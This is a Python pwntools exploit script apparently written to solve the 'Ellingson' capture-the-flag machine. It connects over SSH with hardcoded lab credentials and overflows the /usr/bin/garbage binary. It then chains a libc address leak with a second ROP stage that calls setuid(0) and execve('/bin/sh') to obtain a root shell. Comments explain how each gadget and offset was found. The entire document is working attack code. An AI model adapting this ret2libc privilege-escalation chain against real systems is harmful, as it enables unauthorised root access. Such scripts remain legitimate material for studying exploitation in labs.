import struct, binascii
from pwn import * 
s = ssh(host='Ellingson.htb',user='margo',password='iamgod$08')
p= s.process('/usr/bin/garbage')

# Stage 1 Leak static adressess in the binary : objdump -D /usr/bin/garbage | grep (puts/main)
#401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
# for rdi : rp-lin-x64 -f garbage -r 1 | grep "pop rdi"
plt_main= struct.pack('<Q', 0x401619) # main
plt_put = struct.pack('<Q', 0x401050)
got_put = struct.pack('<Q', 0x404028)
pop_rdi = struct.pack('<Q', 0x0040179b) 

junk = "A"*136 

payload = junk+pop_rdi+got_put+plt_put +plt_main  #we print the adsress of fct puts from libc after been charged and with a random offset, and we back to main again 
p.recvuntil("password:")
p.sendline(payload)
p.recvuntil("denied.\n") 

leaked_puts = p.recv()[:6].strip().ljust(8, '\x00') # error take me a lot of time, i have a wrong leaked addresse cause , it take 8 byte and adresse was about 6 byte so i have to read just the first 6 bytes
print("Leaked puts@GLIBCL: "+ str(leaked_puts))
leaked_puts = struct.unpack('<Q', leaked_puts)[0]


# stage 2 
# adresse of puts of GLIBC from Libc:  readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep puts  , and the same with system
libc_put = 0x809c0
# for /bin/sh : strings -a -t x /lib/x86_64-linux-gnu/libc-2.27.so | grep /bin/sh
libc_sh =0x1b3e9a
libc_setuid=0xe5970
libc_execve=0xe4e30
# rp-lin-x64 -f libc_fromremote.so --unique -r 1 | grep  "pop rdx"
libc_pop_rdx = 0x1b96
libc_pop_rsi = 0x23e6a

offset = leaked_puts - libc_put
sh = offset+libc_sh
setuid = offset +libc_setuid
execve = offset + libc_execve
pop_rdx= offset+libc_pop_rdx
pop_rsi= offset+libc_pop_rsi

# setuid(0)
# execve("/bin/sh",Null,Null)
second_rop= pop_rdi    # place argument of setuid() in the register rdi 
second_rop+=struct.pack('<Q', 0x0000000000000000)
second_rop+=struct.pack('<Q', setuid) # setuid fct 
second_rop+= pop_rdi    # place first arg  of execve() in the register rdi 
second_rop+=struct.pack('<Q', sh) # address of "/bin/sh"
second_rop+=struct.pack('<Q',pop_rdx)  # second arg
second_rop+=struct.pack('<Q', 0x0000000000000000)
second_rop+=struct.pack('<Q',pop_rsi)  # third arg
second_rop+=struct.pack('<Q', 0x0000000000000000) 
second_rop+=struct.pack('<Q', execve)
# final payload 
payload = junk + second_rop  
p.sendline(payload)
p.recvuntil("denied.")
p.interactive()
